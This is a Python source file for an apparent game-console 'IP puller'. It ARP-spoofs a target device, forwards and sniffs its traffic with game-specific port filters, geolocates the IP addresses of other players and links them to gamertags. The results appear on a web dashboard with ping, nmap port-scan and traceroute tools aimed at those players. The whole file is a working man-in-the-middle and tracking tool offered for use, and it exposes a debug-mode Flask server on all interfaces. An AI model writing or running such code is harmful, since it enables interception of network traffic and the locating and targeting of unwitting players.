import os
import time
import threading
import traceback
from collections import deque
import urllib.parse
import requests
from bs4 import BeautifulSoup
from scapy.all import sniff, IP, UDP
import scapy.all as scapy
import IP_INFO
import Store
from datetime import datetime
from flask import Flask, render_template_string, jsonify, request
import windows
from ping import ping


# Shared global data
target = []
invalid_local_hosts = []
captured_ips = {}
connected = []
disconnected = {}
concurrent_connection = {}
new_connection = {}
removed = {}
last_seen = {}  # track last update time per IP
left_session = {}
join_times = {}
pps_history = {}
unstable = {}
settings = {}
first_joined = {}
app = Flask(__name__)


# -----------------------
# Flask: index (dynamic)
# -----------------------
@app.route("/")
def index():
    field_names = ["IP", "Time\nJoined", "ISP", "Country", "State", "City", "ZIP", "Type", "Username", "Joined Times", "PPS"]
    left_field_names = ["IP", "Time\nLeft", "ISP", "Country", "State", "City", "ZIP", "Username", "Left Times"]

    with open("index.html", encoding="utf-8") as f:
        html = f.read()

    return render_template_string(html, field_names=field_names, left_field_names=left_field_names)


# -----------------------
# Save username POST endpoint
# -----------------------
@app.route("/save_username", methods=["POST"])
def save_username():
    data = request.get_json()
    ip = data.get("ip")
    username = data.get("username")

    if username != "":
        with open("IPINFO.db", "a") as f:
            f.write(f"\n{username},{ip}")
            captured_ips[ip][6] = username
    return "", 204


# -----------------------
# /update_ips (PUT)
# -----------------------
@app.route("/update_ips", methods=["PUT"])
def update_ips():
    result = []
    for ip, info in captured_ips.items():
        status = (
            "blue" if ip in new_connection else
            "green" if ip in connected and ip not in new_connection else
            "yellow" if ip in disconnected else
            "purple" if ip in removed else
            "red"
        )

        def safe_get(index):
            return info[index] if len(info) > index else ""

        row = {
            "ip": ip,
            "fields": [
                {"label": "IP", "value": ip},
                {"label": "Time", "value": safe_get(0)},
                {"label": "ISP", "value": safe_get(1)},
                {"label": "Country", "value": safe_get(2)},
                {"label": "State", "value": safe_get(3)},
                {"label": "City", "value": safe_get(4)},
                {"label": "ZIP", "value": safe_get(5)},
                {"label": "Type", "value": safe_get(7)}, #9 for port
                {"label": "Username", "value": safe_get(6)},
                {"label": "Joined Times", "value": safe_get(8)},
                {"label": "pps", "value": concurrent_connection.get(ip, {}).get("pps_avg", 0)}
            ],
            "status": status
        }
        result.append(row)
    # --------------------------
    # Compute stats for top bar
    # --------------------------
    stats = {
        "concurrent": len(captured_ips),
        "connected": len(connected),
        "removed": len(removed),
        "new_connection": len(new_connection),
        "left_players": len(left_session),
    }

    return jsonify({"rows": result, "stats": stats})


# ---------------------
# updates left players
# ---------------------
@app.route("/update_left_ips", methods=["PUT"])
def update_left_ips():
    result = []

    for ip, info in left_session.items():
        def safe_get(index):
            return info[index] if len(info) > index else ""

        row = {
            "ip": ip,
            "fields": [
                {"label": "IP", "value": ip},
                {"label": "Time\nLeft", "value": safe_get(0)},
                {"label": "ISP", "value": safe_get(1)},
                {"label": "Country", "value": safe_get(2)},
                {"label": "State", "value": safe_get(3)},
                {"label": "City", "value": safe_get(4)},
                {"label": "ZIP", "value": safe_get(5)},
                {"label": "Username", "value": safe_get(7)},
                {"label": "Left Times", "value": safe_get(8)}
            ]
        }
        result.append(row)
    result.reverse()
    return jsonify({"rows": result})


# ----------------------
# multitool front end
# ----------------------
@app.route("/ReggiesMultiTool", methods=["GET"])
def ReggiesMultiTool():
    with open("multitool.html", "r", encoding="utf-8") as f:
        html = f.read()
    return render_template_string(html)


# ----------------------
# multitool back end
# ----------------------
@app.route('/Ping+<target>', methods=['POST'])
def ping_target(target):
    ip = urllib.parse.unquote_plus(target)
    results = ping(ip)
    return jsonify({"text": results})


@app.route('/Conn_type+<target>', methods=['POST'])
def Conn_type(target):
    ip = urllib.parse.unquote_plus(target)

    data = requests.get(f"http://ip-api.com/json/{ip}?fields=org,as,mobile,proxy,hosting").json()

    text = f"Organization: {data['org']}\nAS Number: {data['as']}\nMobile?: {data['mobile']}\nVPN?: {data['proxy']}\nHosting?: {data['hosting']}"

    return jsonify({"text": text})


@app.route('/nmap+<target>', methods=['POST'])
def nmap_target(target):
    ip = urllib.parse.unquote_plus(target)
    session = requests.session()

    session.headers.update({
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"})
    session.get("https://hackertarget.com/nmap-online-port-scanner/")
    data = session.post('https://hackertarget.com/nmap-online-port-scanner/', data={"theinput": f"{ip}",
                                                                                    "thetest": "nmap",
                                                                                    "name_of_nonce_field": "admin",
                                                                                    "_wp_http_referer": "/nmap-online-port-scanner/"
                                                                                    })

    soup = BeautifulSoup(data.content, "html.parser")
    results = soup.find_all("pre", attrs={"class": "bg-f9"}, id="formResponse")

    return jsonify({
        "target": ip,
        "results": results[0].get_text(strip=True) if results else "No output found."
    })


@app.route('/usernameLookUp+<username>', methods=['POST'])
def username_lookup_target(username):
    # -------------------------
    # Normalize username input
    # -------------------------
    username = urllib.parse.unquote_plus(username).replace("%20", " ").strip()

    try:

        dict_of_ips_usernames = IP_INFO.get_username(username=username, mode="gamertags")
        # --------------------------------------
        # Prepare JSON response with all pairs
        # --------------------------------------
        results = []
        for user, ip in dict_of_ips_usernames.items():
            results.append({"Gamertag": user, "IP": ip})

        return jsonify({"Results": results})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/Traceroute+<ip>', methods=['POST'])
def Traceroute(ip):
    # -------------------------
    # Normalize IP input
    # -------------------------
    ip = urllib.parse.unquote_plus(ip)

    try:
        data = requests.post("https://traceroute-online.com/query", data={
            "target": ip,
            "query_type": "mtr"
        })
        return jsonify({"Results": data.text})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# -----------------------
# Start Flask
# -----------------------
def start_site():
    app.run(host="0.0.0.0", port=1234, debug=True, use_reloader=False)

# ------------------------
# Traffic Fowarding
# ------------------------
def Allow_ipv4_fowarding(status, interface):
    ##0 off
    ##1 on
    if os.name == "posix":
        if settings["mobile"] == "no":
            with os.popen("sudo sysctl net.ipv4.ip_forward") as status_:
                if status_.read().strip() == "net.ipv4.ip_forward = 0":

                    if status == 1:
                        os.system("sudo sysctl -w net.ipv4.ip_forward=1")
            if status == 0:
                os.system("sudo sysctl -w net.ipv4.ip_forward=0")

            del status
            del status_
    elif os.name == "nt":
        if status == 1:
            windows.enable_ipv4_forwarding_win(interface, 1)
        if status == 0:
            windows.enable_ipv4_forwarding_win(interface, 0)


# -----------------------
# packet spoofer
# -----------------------
def ARP_PacketSpoofer(tip, tmac, spoofip, Router=None):
    if Router is None:
        pkt = scapy.ARP(op=2, pdst=tip, hwdst=tmac, psrc=spoofip)
        scapy.send(pkt, verbose=0)
        scapy.send(pkt, verbose=0)
        del pkt
    else:
        pkt = scapy.ARP(op=2, pdst=tip, hwdst=tmac, psrc=spoofip, hwsrc=Router)
        scapy.send(pkt, verbose=0)
        scapy.send(pkt, verbose=0)



# ------------------------
# Packet sender
# ------------------------
def Packet_Sender(Target_IP, Target_Mac, Spoofip, SpoofMAC, Router_MAC, stop, reset_arp=False):
    if reset_arp is False:
        while str(stop).split()[3] == "unset>":
            try:
                ARP_PacketSpoofer(Target_IP, Target_Mac, Spoofip)
                ARP_PacketSpoofer(Spoofip, SpoofMAC, Target_IP)
                time.sleep(2)
            except:
                break
    if reset_arp is True:
        for l in range(1,3):
            ARP_PacketSpoofer(Target_IP, Target_Mac, Spoofip, Router_MAC)
            ARP_PacketSpoofer(Spoofip, SpoofMAC, Target_IP, Router_MAC)
            time.sleep(2)


# ------------------------
# Packet handling
# ------------------------
def handle_packet(packet):
    try:
        if IP in packet and UDP in packet:
            src_ip = packet[IP].src
            dst_ip = packet[IP].dst
            src_port = str(packet[UDP].sport)

            if src_ip == target[0]:
                src_ip = dst_ip

            if src_ip not in captured_ips and src_ip not in invalid_local_hosts:
                Store.Store_ip(src_ip)
                info = IP_INFO.get_ip(src_ip)
                # ---------------------------------------------------
                # Pad the info so we always have at least 7 elements
                # ---------------------------------------------------
                info = tuple(list(info) + [""] * (7 - len(info)))
                if src_ip in join_times:
                    join_times[src_ip] = join_times[src_ip] + 1
                else:
                    join_times[src_ip] = 1
                # -----------------------------------------------
                # Store captured IP info with consistent indices
                # -----------------------------------------------

                captured_ips[src_ip] = [
                    datetime.now().strftime('%H:%M:%S'),
                    info[0],  # isp
                    info[1],  # country
                    info[2],  # state
                    info[3],  # city
                    info[4],  # zip
                    info[5],  # username
                    info[6],  # type
                    join_times[src_ip],
                    src_port
                ]
                concurrent_connection[src_ip] = {"packets": 1, "pps": 0}
                new_connection[src_ip] = time.time()
            else:
                concurrent_connection[src_ip]["packets"] += 1


        elif IP in packet and packet.haslayer("TCP"):
            src_ip = packet[IP].src
            dst_ip = packet[IP].dst
            src_port = str(packet["TCP"].sport)

            if src_ip == target[0]:
                src_ip = dst_ip

            if src_ip not in captured_ips and src_ip not in invalid_local_hosts:
                Store.Store_ip(src_ip)
                info = IP_INFO.get_ip(src_ip)
                info = tuple(list(info) + [""] * (8 - len(info)))
                if src_ip in join_times:
                    join_times[src_ip] = join_times[src_ip] + 1
                else:
                    join_times[src_ip] = 1

                captured_ips[src_ip] = [
                    datetime.now().strftime('%H:%M:%S'),
                    info[0],  # isp
                    info[1],  # country
                    info[2],  # state
                    info[3],  # city
                    info[4],  # zip
                    info[5],  # username
                    info[6],  # type
                    join_times[src_ip],
                    src_port
                ]

                concurrent_connection[src_ip] = {"packets": 1, "pps": 0}
                new_connection[src_ip] = time.time()
            else:
                concurrent_connection[src_ip]["packets"] += 1

    except:
        error = traceback.format_exc()
        print(error)


# -----------------------
# Connection tracking
# -----------------------
def conncurent(stop,offset=0, server=False):
    # --------------------------------------------
    # Configurable parameters
    # --------------------------------------------
    cya_ip = 20  # Seconds until removed connection marked as left_session
    stuck_timeout = 30  # Seconds until stuck IPs are purged
    check_delay = 8  # Snapshot interval
    min_pps = 0.25  # PPS threshold for activity
    max_unstable_hits = 2  # Consecutive low PPS counts before disconnect
    pps_window_len = 3  # Sliding window size for PPS average
    max_left_session = 30  # Max entries stored in left_session
    server_min = 50 # If Server is chosen a higher pps is usual so if we are looking for servers we only want servers output

    # --------------------------------------------
    # Globals assumed from outer scope
    # --------------------------------------------
    global concurrent_connection, captured_ips, pps_history
    global last_seen, connected, unstable, disconnected
    global removed, left_session, new_connection

    # --------------------------------------------
    # Thread-safe guard for shared dicts
    # --------------------------------------------
    lock = threading.RLock()

    # --------------------------------------------
    # Thread start offset (stagger start times)
    # --------------------------------------------
    if offset > 0:
        time.sleep(offset)

    # --------------------------------------------
    # Connection tracking loop
    # --------------------------------------------
    while not stop.is_set():
        start_cycle = time.time()
        try:
            # Snapshot before
            with lock:
                base_items = {k: v.copy() for k, v in concurrent_connection.items()}

            time.sleep(check_delay)

            # Snapshot after
            with lock:
                after_items = {k: v.copy() for k, v in concurrent_connection.items()}

            current = time.time()

            # ---------------------------------------------------
            # Compare snapshots and update PPS / activity tracking
            # ---------------------------------------------------
            for conn, before_data in base_items.items():
                if not isinstance(before_data, dict):
                    continue

                count_before = before_data.get("packets", 0)
                count_after = after_items.get(conn, {}).get("packets", 0)
                pps = max((count_after - count_before) / check_delay, 0.0)
                # --------------
                # PPS averaging
                # --------------
                dq = pps_history.setdefault(conn, deque(maxlen=pps_window_len))
                dq.append(pps)
                pps_avg = sum(dq) / len(dq)

                concurrent_connection.setdefault(conn, {})
                concurrent_connection[conn]["pps"] = round(pps, 2)
                concurrent_connection[conn]["pps_avg"] = round(pps_avg, 2)
                # --------------------------
                # Active → update last_seen
                # ---------------------------
                if pps_avg > min_pps:
                    last_seen[conn] = current
                elif conn not in last_seen:
                    # ------------------------------------------------------
                    # Initialize last_seen for IPs that never became active
                    # -------------------------------------------------------
                    last_seen[conn] = start_cycle

                # ---------------------------
                # NEW → CONNECTED
                # ---------------------------
                if not server:
                    if conn not in connected and pps_avg >= min_pps:
                        connected.append(conn)
                else:
                    if conn not in connected and pps_avg >= server_min:
                        connected.append(conn)

                # ---------------------------
                # Unstable handling
                # ---------------------------
                if conn not in unstable:
                    unstable[conn] = {"count": 0, "last_flap": current}
                elif pps < min_pps:
                    unstable[conn]["count"] += 1
                    unstable[conn]["last_flap"] = current

                # Too unstable → removed
                if unstable[conn]["count"] >= max_unstable_hits:
                    if conn in connected:
                        connected.remove(conn)
                        removed[conn] = current
                        unstable.pop(conn, None)

            # ------------------------
            # Cleanup new_connection
            # ------------------------
            for new_ip, start_time in list(new_connection.items()):
                if current - start_time > 5:
                    new_connection.pop(new_ip, None)

            # ------------------------
            # removed → left_session
            # ------------------------
            for conn, t in list(removed.items()):
                if current - t > cya_ip:
                    removed.pop(conn, None)

                    info = captured_ips.get(conn, [])
                    if conn not in left_session.keys():
                        left_session[conn] = [
                            datetime.now().strftime('%H:%M:%S'),
                            info[1] if len(info) > 1 else "",
                            info[2] if len(info) > 2 else "",
                            info[3] if len(info) > 3 else "",
                            info[4] if len(info) > 4 else "",
                            info[5] if len(info) > 5 else "",
                            info[8] if len(info) > 8 else "",
                            info[6] if len(info) > 6 else "",
                            1,
                        ]
                    else:
                        left_session[conn][8] += 1
                        left_session[conn][0] = datetime.now().strftime('%H:%M:%S')

                    # Cleanup connection data
                    captured_ips.pop(conn, None)
                    concurrent_connection.pop(conn, None)
                    pps_history.pop(conn, None)

            # ------------------------
            # Cleanup stuck IPs
            # ------------------------
            for conn, last_time in list(last_seen.items()):
                if current - last_time > stuck_timeout:
                    for d in [
                        concurrent_connection,
                        captured_ips,
                        new_connection,
                        disconnected,
                        removed,
                        unstable,
                    ]:
                        d.pop(conn, None)
                    if conn in connected:
                        connected.remove(conn)
                    last_seen.pop(conn, None)
                    pps_history.pop(conn, None)
            # Limit left_session size
            while len(left_session) >= max_left_session:
                del left_session[next(iter(left_session))]

        except Exception:
            print("Concurrent Loop Error:\n" + traceback.format_exc())

        # -----------------------
        # Maintain perfect timing
        # -----------------------
        elapsed = time.time() - start_cycle
        sleep_time = max(0, check_delay - elapsed)
        time.sleep(sleep_time)


# -----------------
# Sniffing wrapper
# -----------------
def sniffing(Target_IP, localhosts, game_choice, interface, console_port):
    target.append(Target_IP)
    Store.reset_ip()

    # Remove Target_IP properly
    if Target_IP in localhosts:
        localhosts.remove(Target_IP)

    filter_nets = ""
    for ip in localhosts:
        if filter_nets == "":
            filter_nets += f"not net {ip}/32 "
        else:
            filter_nets += f"and not net {ip}/32 "

    filters = {
        "1.1": f"udp src port 6672 and not net 177.237.0.0/16 and not net 192.81.0.0/16 and not net 192.168.0.0/16 and {filter_nets}",
        "1.2": f"((udp src port {console_port}) or (udp src port 3074) or (udp src port 50306)) and ({filter_nets})",
        "1.3": f"udp src port 3075 and not net 192.168.0.0/16 and {filter_nets}",
        "1.4": f"(udp port {console_port} or udp port 3074) and {filter_nets}",
        "1.5": f"udp port {console_port} and {filter_nets}",
        "2.1": f"udp and src portrange 49152-65535 and not net 192.168.0.0/16 and {filter_nets}",
        "2.2": f"(udp and ((src port 2700 or src port 2500 or src port 3600 or src port 3800 or src port 2400 or (src port >= 61101 and src port <= 63614))) and ({filter_nets}))",
        "2.3": f"udp port {console_port} and {filter_nets}",
        "2.4": f"udp port {console_port} and {filter_nets}",
        "3.1": f"{filter_nets}"
    }

    sniff(
        iface=interface,
        filter=filters.get(game_choice, ""),
        prn=handle_packet,
        store=0
    )


# -------------------
# Start all threads
# -------------------


def startthread(Target_IP, Target_MAC, Spoof_IP, Spoof_MAC, Routers_MAC, local, interface, port, mobile):
    global arp_thread
    with open("puller.settings", "r") as f:
        for line in f.readlines():
            settings_name, setting = line.split(" ")
            settings[settings_name.strip()] = setting.strip()
    Allow_ipv4_fowarding(1, interface)
    choice = input("1. (Peer 2 Peer)\n2. (Servers)\n3. (Sniff All)\nChoice (1-3): ")

    def choose():
        if choice == "1":
            game = input(
                "Peer To Peer List\n===================\n1. Grand Theft Auto V\n2. Grand Theft Auto VI\n3. Call Of Duty 3\n4. Monopoly\n5. Minecraft (Private Worlds)\nPick a Choice (1-5): ")
        elif choice == "2":
            game = input("SERVER LIST \n================\n1. Roblox \n2. Gang Beast \n3. Call of Duty (WarZone 2.0)\n4. Rainbow Six Siege\nChoose (1-3): ")
        elif choice == "3":
            return "3.1"

        return f"{choice}.{game}"

    game_choice = choose()
    stop_event = threading.Event()

    sniffer_thread = threading.Thread(target=sniffing, args=(Target_IP, local, game_choice, interface, port),
                                      daemon=True)
    if choice == "2":
        conn_thread = threading.Thread(target=conncurent, args=(stop_event, 0, True), daemon=True)
        conn_thread2 = threading.Thread(target=conncurent, args=(stop_event, 4, True), daemon=True)
    else:
        conn_thread = threading.Thread(target=conncurent, args=(stop_event, 0), daemon=True)
        conn_thread2 = threading.Thread(target=conncurent, args=(stop_event, 4), daemon=True)
    if Target_MAC is not None:
        import mobile as mobile_script
        mobile_foward_thread = threading.Thread(target=mobile_script.main, args=(interface, Target_IP, Spoof_IP, 2, 8), daemon=True)
        arp_thread = threading.Thread(target=Packet_Sender,
                                      args=(Target_IP, Target_MAC, Spoof_IP, Spoof_MAC, Routers_MAC, stop_event),
                                      daemon=True)
        arp_thread.start()
        if mobile == "yes":
            mobile_foward_thread.start()

    sniffer_thread.start()
    conn_thread.start()
    conn_thread2.start()
    start_site()
    print("\n[INFO] KeyboardInterrupt received — shutting down...")





    Allow_ipv4_fowarding(0, interface)
    stop_event.set()
    print("======================\n\nResettings connections to your console\nPlease Be Patient should take about 6 seconds\n\n======================")
    Packet_Sender(Target_IP, Target_MAC, Spoof_IP, Spoof_MAC, Routers_MAC, None, reset_arp=True)
    print("======================\n\nDONE Please Close The Terminal\n\n======================")

    if Target_MAC is not None:
        arp_thread.join()
    if settings["mobile"] == "yes":
        mobile_foward_thread.join()
    sniffer_thread.join()
    conn_thread.join()
    conn_thread2.join()


